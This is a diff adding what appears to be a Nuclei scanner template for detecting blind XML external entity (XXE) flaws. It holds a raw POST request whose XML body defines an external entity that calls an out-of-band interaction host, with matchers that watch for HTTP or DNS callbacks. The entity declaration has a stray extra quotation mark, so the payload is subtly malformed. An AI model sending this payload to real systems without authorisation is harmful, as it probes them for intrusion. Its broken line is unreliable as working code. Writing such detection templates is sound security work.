@@ -1,0 +1,30 @@
+id: generic-blind-xxe
+
+info:
+  name: Generic Blind XXE
+  author: reewardius
+  severity: high
+  tags: xxe,generic
+    
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Content-Type: application/xml
+        Referer: {{BaseURL}}
+        
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [
+        <!ELEMENT foo ANY>
+        <!ENTITY xxe SYSTEM "http://{{interactsh-url}}"">]>
+        <foo>&xxe;</foo>
+        
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
